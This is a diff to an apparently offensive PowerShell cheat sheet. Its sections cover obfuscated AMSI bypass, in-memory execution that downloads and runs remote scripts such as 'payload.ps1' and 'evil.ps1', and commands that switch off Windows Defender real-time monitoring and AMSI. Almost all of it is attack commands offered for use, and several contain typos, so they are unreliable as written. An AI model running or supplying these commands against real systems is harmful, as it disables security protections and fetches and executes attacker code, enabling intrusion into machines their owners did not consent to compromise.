@@ -34,7 +34,7 @@ C:> S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "
 ```
 ### Memory Execution
 ---
-```powershell``
+```powershell
 C:> iex New Object Net.WebClient DownloadString('https://webserver/payload.ps1')
 ```
 ```powershell
@@ -57,6 +57,7 @@ C:> iex (iwr 'http 192.168.230.1/evil.ps1')
 ---
 Admin Privileges Required
 ```powershell
+C:> Powershell -ep bypass
 C:> Set-MpPreference -DisableIOAVProtection $true
 C:> Set-MpPreference -Disablerealtimemonitoring $true
 C:> "[Ref].Assembly.GetType('System.MAnagement.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublix,Static').SetValue($null,$true)"
